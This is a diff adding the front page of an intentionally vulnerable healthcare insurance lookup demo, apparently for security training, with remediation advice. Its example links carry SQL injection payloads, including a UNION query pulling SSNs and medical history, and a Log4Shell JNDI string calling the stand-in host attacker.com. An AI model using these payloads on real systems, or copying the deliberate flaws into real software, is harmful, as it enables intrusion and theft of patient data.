@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Healthcare Insurance Portal - Vulnerable Demo</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Healthcare Insurance Portal</h1>
+            <p class="subtitle">Patient Insurance Lookup System</p>
+        </header>
+
+        <div class="demo-section">
+            <h2>🔍 Patient Insurance Lookup</h2>
+            <p>Search for patient insurance information by Member ID</p>
+            
+            <form action="insurance" method="GET" class="search-form">
+                <div class="form-group">
+                    <label for="patientId">Member ID:</label>
+                    <input type="text" id="patientId" name="patientId" placeholder="Enter Patient ID (e.g., P12345)" required>
+                </div>
+                <button type="submit" class="btn-primary">🔎 Search Insurance Records</button>
+            </form>
+
+            <div class="examples">
+                <h3>Try these examples:</h3>
+                <ul>
+                    <li><a href="insurance?patientId=P12345">Normal lookup: P12345</a></li>
+                    <li><a href="insurance?patientId=P001' OR '1'='1">SQL Injection: P001' OR '1'='1</a></li>
+                    <li><a href="insurance?patientId=' UNION SELECT patient_name, ssn, policy_number, medical_history FROM patient_insurance --">Data Theft Attack</a></li>
+                    <li><a href="insurance?patientId=${jndi:ldap://attacker.com/exploit}">Log4Shell: ${jndi:ldap://attacker.com/exploit}</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="vulnerabilities">
+
+            <div class="info-box">
+                <h2>System Information</h2>
+                <ul>
+                    <li><strong>Java Version:</strong> 1.8</li>
+                    <li><strong>Server:</strong> Open Liberty</li>
+                    <li><strong>Log4j Version:</strong> 2.14.1 (Vulnerable to CVE-2021-44228)</li>
+                    <li><strong>Data Type:</strong> Protected Health Information (PHI)</li>
+                </ul>
+            </div>
+
+            <h2>⚠️ Critical Healthcare Security Vulnerabilities</h2>
+            
+            <div class="vulnerability-card">
+                <h3>1. SQL Injection - PHI Data Breach Risk</h3>
+                <p>Patient IDs are directly concatenated into SQL queries, allowing attackers to:</p>
+                <ul>
+                    <li>Access entire patient database</li>
+                    <li>Steal Social Security Numbers</li>
+                    <li>Extract insurance policy numbers</li>
+                    <li>View medical history records</li>
+                </ul>
+                <p class="severity high">Severity: HIGH | HIPAA Violation Risk</p>
+            </div>
+            
+            <div class="vulnerability-card">
+                <h3>2. Log4Shell (CVE-2021-44228) - Remote Code Execution</h3>
+                <p>Using Log4j 2.14.1 allows attackers to:</p>
+                <ul>
+                    <li>Execute arbitrary code on the server</li>
+                    <li>Steal entire patient database</li>
+                    <li>Install ransomware</li>
+                    <li>Gain complete system access</li>
+                </ul>
+                <p class="severity critical">Severity: CRITICAL | Immediate Action Required</p>
+            </div>
+
+            <div class="vulnerability-card hipaa">
+                <h3>3. HIPAA Compliance Violations</h3>
+                <p>This application violates multiple HIPAA requirements:</p>
+                <ul>
+                    <li>Inadequate access controls (SQL Injection)</li>
+                    <li>Insufficient security measures</li>
+                    <li>Vulnerable to unauthorized PHI disclosure</li>
+                    <li>No proper audit logging</li>
+                </ul>
+                <p class="severity critical">Compliance Risk: CRITICAL | Potential Fines: $50,000+ per violation</p>
+            </div>
+        </div>
+
+        <div class="upgrade-info">
+            <h2>🚀 Modernization & Security Remediation</h2>
+            <p>This legacy healthcare application must be upgraded to meet modern security standards:</p>
+            <ul>
+                <li>Upgrade from Java 8 to Java 25</li>
+                <li>Fix Log4Shell vulnerability (Update Log4j to 2.23.1+)</li>
+                <li>Implement parameterized SQL queries</li>
+                <li>Add proper input validation</li>
+                <li>Ensure HIPAA compliance</li>
+            </ul>
+            <p><strong>See README.md for detailed upgrade instructions.</strong></p>
+        </div>
+
+        <footer>
+            <p>⚕️ Healthcare Demo Application - For Security Training Purposes Only</p>
+            <p class="warning-text">⚠️ Contains intentional vulnerabilities - DO NOT use with real patient data</p>
+        </footer>
+    </div>
+</body>
+</html>
